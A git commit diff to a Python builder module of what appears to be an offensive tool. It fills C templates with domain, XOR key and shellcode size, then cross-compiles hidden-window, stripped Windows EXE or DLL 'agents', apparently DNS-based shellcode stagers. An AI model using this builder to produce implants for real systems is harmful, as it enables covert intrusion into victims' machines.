e25c3fd12c4babcfdf0952224080c2cd3c8ea2ea
mhaskar <m.askar@isecur1ty.org>
2022-02-01 20:35:09 +0000

    DLL builder and other changes

--- core/builders.py
+++ core/builders.py
@@ -4,7 +4,7 @@
 import os
 from .functions import *
 
-def build_c_xor_ipv6(domain, prefix, time, output_path, key, arch):
+def build_c_xor_ipv6(domain, prefix, time, output_path, key, arch, size):
     template_name = "client-ipv6-generic.c"
     template_path = "templates/%s" % template_name
     fi = open(template_path, "r")
@@ -17,6 +17,7 @@ def build_c_xor_ipv6(domain, prefix, time, output_path, key, arch):
     code = code.replace("{PREFIX}", prefix)
     code = code.replace("{SLEEPTIME}", time)
     code = code.replace("{KEY}", str(key))
+    code = code.replace("{SHELLCODESIZE}", str(size))
 
     # Close file after edit
     fi.close()
@@ -30,9 +31,10 @@ def build_c_xor_ipv6(domain, prefix, time, output_path, key, arch):
         # Check if we have mingw installed
         if os.system("which x86_64-w64-mingw32-gcc") == 0:
             # Compile the code and save it to output path
-            compile_command = "x86_64-w64-mingw32-gcc ctemptemplate.c -w -o %s -ldnsapi" % output_path
+            compile_command = "x86_64-w64-mingw32-gcc ctemptemplate.c -fdata-sections -ffunction-sections -w -o %s -ldnsapi -mwindows -Wl,--gc-sections" % output_path
             if os.system(compile_command) == 0:
                 print_success("Agent generated successfully to %s" % output_path)
+                os.system("strip %s" % output_path)
             else:
                 print_error("Error while generating the agent")
                 exit()
@@ -47,9 +49,10 @@ def build_c_xor_ipv6(domain, prefix, time, output_path, key, arch):
         # i686-w64-mingw32-gcc
         if os.system("which x86_64-w64-mingw32-gcc") == 0:
             # Compile the code and save it to output path
-            compile_command = "i686-w64-mingw32-gcc -m32 ctemptemplate.c -w -o %s -ldnsapi" % output_path
+            compile_command = "i686-w64-mingw32-gcc -m32 ctemptemplate.c -fdata-sections -ffunction-sections -w -o %s -ldnsapi -mwindows -Wl,--gc-sections" % output_path
             if os.system(compile_command) == 0:
                 print_success("Agent generated successfully to %s" % output_path)
+                os.system("strip %s" % output_path)
             else:
                 print_error("Error while generating the agent")
                 exit()
@@ -58,6 +61,66 @@ def build_c_xor_ipv6(domain, prefix, time, output_path, key, arch):
             exit()
         # clean up temp code
         os.system("rm ctemptemplate.c")
+
+
+def build_c_xor_ipv6_dll(domain, prefix, time, output_path, key, arch, size):
+    template_name = "client-ipv6-generic-dll.c"
+    template_path = "templates/%s" % template_name
+    fi = open(template_path, "r")
+
+    # Read template file
+    template_data = fi.read()
+
+    # Edit template file
+    code = template_data.replace("{DOMAIN}", domain)
+    code = code.replace("{PREFIX}", prefix)
+    code = code.replace("{SLEEPTIME}", time)
+    code = code.replace("{KEY}", str(key))
+    code = code.replace("{SHELLCODESIZE}", str(size))
+
+    # Close file after edit
+    fi.close()
+
+    # Open file again to write temp code
+    fi2 = open("ctemptemplatedll.c", "w")
+    fi2.write(code)
+    fi2.close()
+
+    if arch == "x64":
+        # Check if we have mingw installed
+        if os.system("which x86_64-w64-mingw32-gcc") == 0:
+            # Compile the code and save it to output path
+#            compile_command = "x86_64-w64-mingw32-gcc ctemptemplatedll.c -w -o %s -ldnsapi" % output_path
+            compile_command = "x86_64-w64-mingw32-gcc -shared -o %s ctemptemplatedll.c -ldnsapi  -w" % output_path
+            if os.system(compile_command) == 0:
+                print_success("Agent generated successfully to %s" % output_path)
+                os.system("strip %s" % output_path)
+            else:
+                print_error("Error while generating the agent")
+                exit()
+        else:
+            print_error("mingw compiler is not installed")
+            exit()
+
+        # clean up temp code
+        os.system("rm ctemptemplatedll.c")
+
+    elif arch == "x86":
+        # i686-w64-mingw32-gcc
+        if os.system("which x86_64-w64-mingw32-gcc") == 0:
+            # Compile the code and save it to output path
+            compile_command = "i686-w64-mingw32-gcc -m32 -shared -o %s ctemptemplatedll.c -ldnsapi -w" % output_path
+            if os.system(compile_command) == 0:
+                print_success("Agent generated successfully to %s" % output_path)
+                os.system("strip %s" % output_path)
+            else:
+                print_error("Error while generating the agent")
+                exit()
+        else:
+            print_error("mingw compiler is not installed")
+            exit()
+        # clean up temp code
+        os.system("rm ctemptemplatedll.c")
 
 
 def build_golang_xor_ipv6(domain, prefix, time, output_path, key, arch):
